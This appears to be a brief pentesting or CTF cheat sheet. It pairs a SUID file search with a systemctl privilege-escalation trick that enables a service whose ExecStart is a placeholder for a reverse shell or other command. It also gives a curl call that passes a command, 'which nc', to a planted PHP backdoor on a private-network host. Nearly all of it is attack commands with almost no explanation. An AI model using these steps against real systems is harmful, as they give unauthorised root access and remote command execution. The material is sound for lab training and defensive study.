find . -perm -4000 --> finds files with suid set in current directory

Create service using echo:
	TF=$(mktemp).service
	echo '[Service]
	Type=oneshot
	ExecStart="\<reverse shell or desired command>"
	[Install]
	WantedBy=multi-user.target' > $TF
	
	./systemctl link $TF
	./systemctl enable --now $TF

Curl
curl can use the flag --data-urlencode to encode commands
```
curl http://192.168.50.11/project/uploads/users/420919-backdoor.php --data-urlencode "cmd=which nc"
```
